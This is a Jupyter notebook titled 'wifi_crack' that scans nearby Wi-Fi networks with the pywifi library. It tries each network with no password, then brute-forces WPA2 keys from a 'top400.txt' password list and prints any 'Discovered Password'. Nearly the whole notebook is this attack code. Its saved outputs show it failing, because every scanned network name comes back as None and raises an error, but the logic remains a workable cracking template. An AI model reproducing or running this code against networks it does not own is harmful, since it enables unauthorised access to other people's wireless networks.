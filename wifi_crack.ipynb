{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "import time\n",
    "#To hault the flow of program\n",
    "#https://docs.python.org/3/library/time.html\n",
    "\n",
    "#pip install pywifi\n",
    "\n",
    "import pywifi\n",
    "from pywifi import const\n",
    "#To work with wireless interfaces\n",
    "#https://pypi.org/project/pywifi/\n",
    "#https://github.com/awkman/pywifi/blob/master/DOC.md"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "keys = []\n",
    "final_output = {}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Get interface information"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Get the name of the Wi-Fi interface."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "en0\n"
     ]
    }
   ],
   "source": [
    "print(interface.name())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Now let's scan the network."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "interface.scan()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "time.sleep(5) \n",
    "#Because the scan time for each Wi-Fi interface is variant. \n",
    "#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan()."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Obtain the results of the previous triggerred scan. A Profile list will be returned."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'list'>\n"
     ]
    }
   ],
   "source": [
    "x = interface.scan_results()\n",
    "print(type(x))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Let's see all network Profiles"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "for i in x:\n",
    "    #print(i.ssid)\n",
    "    available_devices.append(i.ssid)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n",
      "Host Name => None\n"
     ]
    }
   ],
   "source": [
    "for i in available_devices:\n",
    "    print (\"{:<5} => {:}\".format(\"Host Name\", i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'strip'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "Input \u001b[0;32mIn [17]\u001b[0m, in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m available_devices:\n\u001b[1;32m      2\u001b[0m     nm \u001b[38;5;241m=\u001b[39m i\n\u001b[0;32m----> 3\u001b[0m     i\u001b[38;5;241m=\u001b[39m\u001b[43mi\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mstrip\u001b[49m()\n\u001b[1;32m      4\u001b[0m     profile \u001b[38;5;241m=\u001b[39m pywifi\u001b[38;5;241m.\u001b[39mProfile()\n\u001b[1;32m      5\u001b[0m     profile\u001b[38;5;241m.\u001b[39mssid \u001b[38;5;241m=\u001b[39m i\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'strip'"
     ]
    }
   ],
   "source": [
    "for i in available_devices:\n",
    "    nm = i\n",
    "    i=i.strip()\n",
    "    profile = pywifi.Profile()\n",
    "    profile.ssid = i\n",
    "    profile.auth = const.AUTH_ALG_OPEN\n",
    "    profile.akm.append(const.AKM_TYPE_NONE)\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    iface = wifi.interfaces()[0]\n",
    "    iface.remove_all_network_profiles()\n",
    "    profile = iface.add_network_profile(profile)\n",
    "    iface.connect(profile)\n",
    "    time.sleep(4)\n",
    "    if iface.status() == const.IFACE_CONNECTED:\n",
    "        print('success password of the network',i,' is',\"none\")\n",
    "        final_output[i] = \"\"\n",
    "        available_devices.remove(nm)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# step-2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "with open('top400.txt','r') as f:\n",
    "    for i in f:\n",
    "        i = i.replace('\\n','')\n",
    "        if i not in keys:\n",
    "            keys.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "print(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'NoneType' object has no attribute 'strip'\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    for i in available_devices:\n",
    "        profile = pywifi.Profile()\n",
    "        i=i.strip()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "        flag=0\n",
    "        for j in keys:\n",
    "            j=j.strip()\n",
    "            profile.key = j\n",
    "            wifi = pywifi.PyWiFi()\n",
    "            iface = wifi.interfaces()[0]\n",
    "            iface.remove_all_network_profiles()\n",
    "            profile = iface.add_network_profile(profile)\n",
    "\n",
    "            iface.connect(profile)\n",
    "            time.sleep(4)\n",
    "            if iface.status() == const.IFACE_CONNECTED:\n",
    "                print('success password of the network',i,' is',j)\n",
    "                final_output[i] = j\n",
    "                flag=1\n",
    "                break\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "        #if flag == 0:\n",
    "        #print('sorry we are not able to CRACK PASSWORD of',i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [],
   "source": [
    "print('*'*10,'Discovered Password','*'*10)\n",
    "print(\"{0:<12} {1:<}\".format(\"HOST NAME\",\"PASSWORD\"))\n",
    "for SSID,Key in final_output.items():\n",
    "    print (\"{:<12}|{:<12}\".format(SSID, Key))\n",
    "available_devices.clear()"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
